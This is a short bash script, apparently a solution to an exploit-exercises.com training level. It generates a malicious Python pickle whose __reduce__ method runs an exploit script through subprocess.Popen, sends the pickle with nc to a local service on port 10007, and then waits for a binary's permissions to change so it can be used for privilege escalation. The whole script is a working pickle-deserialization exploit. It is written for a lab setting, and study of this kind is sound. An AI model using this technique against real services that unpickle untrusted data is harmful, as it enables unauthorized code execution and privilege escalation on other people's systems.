#!/bin/bash -eu
# Copyright (c) 2016, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

PICKLE=$(mktemp --suffix=.py)
registerTrap "rm $PICKLE" EXIT

# Thanks to https://blog.nelhage.com/2011/03/exploiting-pickle/
cat <<EOF > $PICKLE
#!$(which python)

import pickle
import subprocess

class RunExploit(object):
  def __reduce__(self):
    return (subprocess.Popen, (('$EXPLOIT_SCRIPT',),))

print pickle.dumps(RunExploit())
print "blub"
EOF

chmod +x $PICKLE
$PICKLE | nc localhost 10007 >/dev/null &
while ! find $EXPLOIT_BIN -perm -o$TARGET_PERM 2>/dev/null | grep $EXPLOIT_BIN >/dev/null
do
  sleep 0.001
true
done

exploit_with_binary
